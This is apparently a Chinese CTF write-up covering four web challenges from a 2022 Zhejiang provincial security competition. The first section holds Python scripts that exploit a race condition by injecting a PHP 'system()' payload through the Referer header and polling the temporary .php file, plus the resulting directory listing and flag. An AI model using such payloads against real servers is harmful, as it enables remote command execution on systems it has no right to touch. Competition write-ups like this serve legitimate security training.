---
title: 第五届浙江省大学生网络与信息安全竞赛-技能挑战赛Web Writeup
date: 2022-09-17 22:46:00
updated: 2022-09-17 22:46:00
tags: [ctf,security]
description: 记录省赛预赛两道没做出的Web题
category: CTF
---

## 买买买01
条件竞争，当时没思考清楚的问题是，我知道通过条件竞争可以短时间的在系统上有一个.txt.php文件，但是没想明白怎么去让这个php文件被解析，因为file_get_contents这个函数只能读取文件内容但是却不会解析。其实只要直接访问就行。。。。

多线程也行，同时运行俩python文件也行。

```python
import requests
while 1:
    response = requests.get(
        "http://1.14.97.218:21715/e7a1b1b1e092b53be5fa11394bbed8fb/e7a1b1b1e092b53be5fa11394bbed8fb.txt2.php")
    if response.status_code != 404:
        print(response.text)
```

```python
import requests
while 1:
    # res = requests.get("http://1.14.97.218:21715/index.php?action=copy", headers={"referer": "<?php system('ls /');?>"})
    res = requests.get("http://1.14.97.218:21715/index.php?action=copy", headers={"referer": "<?php system('cat /fla444444444444g');?>"})
    # print(res.text)

```

```python
competebin
boot
dev
etc
fla444444444444g
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

```
competeDASCTF{43378609768205435621416258245141}
```

## nisc_easyweb
这个电脑没装扫描器省赛又不让上网。。。。所以根本就没发现/robots.txt

纯傻逼题目。。。

```python
http://1.14.97.218:27359/test_api.php?i=FlagInHere

DASCTF{84772015113998304475018439433695}
```

## js小游戏
f12一看index.js,base64解码就行

## 学生管理系统
注册账号就有Flag,可能是非预期吧

感觉预赛的时候有点手忙脚乱，继续沉淀。